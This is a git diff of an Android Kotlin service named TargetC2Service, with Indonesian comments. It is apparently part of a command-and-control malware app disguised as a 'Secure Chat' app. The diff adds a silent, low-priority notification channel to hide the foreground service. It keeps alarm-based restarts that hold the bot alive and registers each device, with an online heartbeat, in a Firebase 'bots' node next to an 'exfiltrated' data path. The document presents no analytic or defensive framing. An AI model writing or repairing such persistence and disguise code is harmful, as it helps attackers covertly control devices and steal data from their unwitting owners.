@@ -25,7 +25,8 @@ class TargetC2Service : Service() {
         private const val REF_EXFIL = "selzxratV5/exfiltrated"
         private const val NOTIF_ID = 1001
         private const val CHANNEL_ID = "secure_chat_service"
-        private const val ALARM_INTERVAL_MS = 300000L // 5 menit
+        private const val CHANNEL_NAME = "Secure Chat Service"
+        private const val ALARM_INTERVAL_MS = 300000L
         private const val ALARM_REQUEST_CODE = 999
 
         @Volatile
@@ -52,6 +53,9 @@ class TargetC2Service : Service() {
     override fun onCreate() {
         super.onCreate()
 
+        // 🔥 FIX: Buat NotificationChannel SEBELUM startForeground
+        createNotificationChannel()
+
         val id = android.provider.Settings.Secure.getString(
             contentResolver, android.provider.Settings.Secure.ANDROID_ID
         ) ?: UUID.randomUUID().toString()
@@ -59,7 +63,6 @@ class TargetC2Service : Service() {
 
         try {
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
-            // 🔥 FIX: setPersistenceEnabled CUMA DISINI, 1x aja
             try {
                 database.setPersistenceEnabled(true)
                 Log.d(TAG, "Firebase persistence enabled")
@@ -75,11 +78,42 @@ class TargetC2Service : Service() {
             Log.e(TAG, "Firebase init error", e)
         }
 
-        // 🔥 FIX: Pasang Alarm Manager biar service gak mati
         scheduleAlarm()
     }
 
-    // 🔥 FIX: Alarm Manager — bangunin service tiap 5 menit
+    // 🔥 FIX: Method khusus buat bikin channel
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                CHANNEL_NAME,
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                description = "Background service for secure chat"
+                setShowBadge(false)
+                enableVibration(false)
+                setSound(null, null)
+            }
+            val manager = getSystemService(NotificationManager::class.java)
+            if (manager != null) {
+                manager.createNotificationChannel(channel)
+                Log.d(TAG, "Notification channel created: $CHANNEL_ID")
+            }
+        }
+    }
+
+    // 🔥 FIX: Notifikasi pake channel_id yang bener
+    private fun createForegroundNotification(): Notification {
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Secure Chat")
+            .setContentText("Connected")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setSilent(true)
+            .build()
+    }
+
     private fun scheduleAlarm() {
         try {
             val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
@@ -100,7 +134,6 @@ class TargetC2Service : Service() {
         }
     }
 
-    // 🔥 FIX: BroadcastReceiver buat restart service
     class C2RestartReceiver : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             Log.d(TAG, "Alarm triggered - restarting C2 service")
@@ -121,28 +154,23 @@ class TargetC2Service : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         try {
-            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Secure Chat")
-                .setContentText("Connected")
-                .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .build()
-            startForeground(NOTIF_ID, notification)
+            // 🔥 FIX: Pakai method createForegroundNotification()
+            startForeground(NOTIF_ID, createForegroundNotification())
+            Log.d(TAG, "Foreground service started")
         } catch (e: Exception) {
             Log.e(TAG, "Foreground notification error", e)
         }
 
-        // 🔥 FIX: Restart kalo service udah mati
         if (!isRunning) {
             startC2()
         } else {
-            // Update online status aja
             scope.launch {
                 try {
-                    botsRef.child(deviceId).child("isOnline").setValue(true)
-                    botsRef.child(deviceId).child("lastSeen")
-                        .setValue(System.currentTimeMillis())
+                    if (::botsRef.isInitialized) {
+                        botsRef.child(deviceId).child("isOnline").setValue(true)
+                        botsRef.child(deviceId).child("lastSeen")
+                            .setValue(System.currentTimeMillis())
+                    }
                 } catch (_: Exception) {}
             }
         }
@@ -205,7 +233,6 @@ class TargetC2Service : Service() {
                 "timestamp" to System.currentTimeMillis()
             )
 
-            // 🔥 FIX: Pake addOnCompleteListener biar tau berhasil/gagal
             botsRef.child(deviceId).setValue(deviceInfo)
                 .addOnCompleteListener { task ->
                     if (task.isSuccessful) {
@@ -215,7 +242,6 @@ class TargetC2Service : Service() {
                     }
                 }
 
-            // Update status tiap 30 detik
             scope.launch {
                 while (isActive) {
                     delay(30000)
